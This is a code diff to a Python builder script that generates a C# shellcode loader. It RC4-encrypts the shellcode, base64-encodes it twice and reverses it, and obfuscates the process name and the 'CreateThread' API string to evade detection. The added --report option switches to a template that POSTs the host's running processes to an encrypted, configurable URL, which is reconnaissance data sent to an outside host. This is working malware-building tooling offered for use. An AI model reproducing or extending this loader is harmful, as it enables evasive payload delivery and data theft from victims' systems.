@@ -138,6 +138,7 @@ if __name__ == "__main__":
     parser.add_argument('--config', help='Path to the JSON config file.')
     parser.add_argument('--out', help='Output solution name.')
     parser.add_argument('--override', nargs='?', default=False, help='Delete destination if exists')
+    parser.add_argument('--report', nargs='?', default=False, help='Add POST requests with running processes')
     args = parser.parse_args()
     
     if args.config == None or args.out == None:
@@ -152,12 +153,19 @@ if __name__ == "__main__":
     key = gen.gen_rc4_key(32)
     cipher = base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1])
     
-    template = gen.set_template("template/Program.cs").get_output()
+    template_path = "template/Program.cs"
+    if args.report:
+        template_path = "template/Program-report.cs"
+	
+    template = gen.set_template(template_path).get_output()
     template = template.replace("[KEY]", gen.format_rc4_key(key)) \
     .replace("[PAYLOAD]", cipher) \
     .replace("[PROCESS_NAME]", base64.b64encode(rc4.Encrypt(config.get("process_name"), key))) \
-	.replace("[CREATE_THREAD]", base64.b64encode(rc4.Encrypt("CreateThread", key))) 
+    .replace("[CREATE_THREAD]", base64.b64encode(rc4.Encrypt("CreateThread", key))) \
     
+    if args.report:
+        template = template.replace("[URL_REPORT]", base64.b64encode(rc4.Encrypt(config.get("url_report"), key)))
+	
     Helper.save_file("%s/Program.cs" % out_dir, template)
     
     template = gen.set_template("template/Form1.Designer.cs").get_output()
